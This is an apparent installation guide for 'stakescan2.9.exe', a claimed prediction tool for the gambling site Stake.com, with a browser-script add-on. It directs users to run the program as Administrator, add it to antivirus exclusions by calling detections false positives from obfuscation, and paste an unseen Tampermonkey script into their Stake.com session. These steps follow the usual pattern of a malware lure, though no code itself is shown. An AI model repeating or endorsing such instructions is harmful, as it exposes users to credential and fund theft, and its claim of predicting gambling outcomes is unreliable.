# :tools: Installation Guide

**1. Main Application**

Download the latest release from the Releases section.

Extract all files from the .zip archive to a dedicated folder.

Run stakescan2.9.exe as Administrator. This is required to sync the software with your hardware ID (HWID).

Enter your private license key provided by the community staff.

**[!IMPORTANT]**
**Antivirus Note: If your antivirus flags the file, please add it to exclusions. Our software uses high-level encryption (PyArmor/Nuitka) to protect our proprietary prediction algorithms, which can sometimes trigger false positives.**

**2. Browser Extension Setup (Tampermonkey)**

To interface the desktop app with the browser, you need the Tampermonkey extension:

Firefox: Install from Add-ons

Enabling Developer Mode (Required)

Go to your browser's Extensions page:

Chrome: chrome://extensions

Firefox: about:addons

Enable Developer mode (toggle switch in the top right for Chrome).

**3. Injecting the Stake.com Script**

Click the Tampermonkey icon in your browser toolbar.

Select "Create a new script".

Delete all default code and paste the script from our official link:

Press Ctrl+S to save.
